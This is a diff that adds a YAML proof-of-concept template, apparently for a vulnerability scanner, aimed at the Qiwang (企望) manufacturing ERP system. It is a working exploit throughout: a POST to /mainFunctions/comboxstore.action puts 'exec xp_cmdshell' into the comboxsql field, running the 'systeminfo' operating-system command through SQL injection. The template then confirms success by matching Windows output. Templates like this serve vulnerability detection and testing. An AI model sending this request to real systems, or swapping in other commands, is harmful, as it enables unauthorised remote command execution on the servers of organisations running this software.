@@ -1,0 +1,17 @@
+id: poc-yaml-qwzz-ERP-system-sql-injection
+info:
+  name: 企望制造ERP系统rce漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 企望制造ERP系统
+requests:
+- method: POST
+  path: /mainFunctions/comboxstore.action
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: comboxsql=exec%20xp_cmdshell%20'systeminfo'
+  expression: status_code == 200 && contains(body,"Microsoft Windows") && contains(body,"NOListItemPersonalFilledAll")
+    && duration > 2
+variables: {}
+transport: http
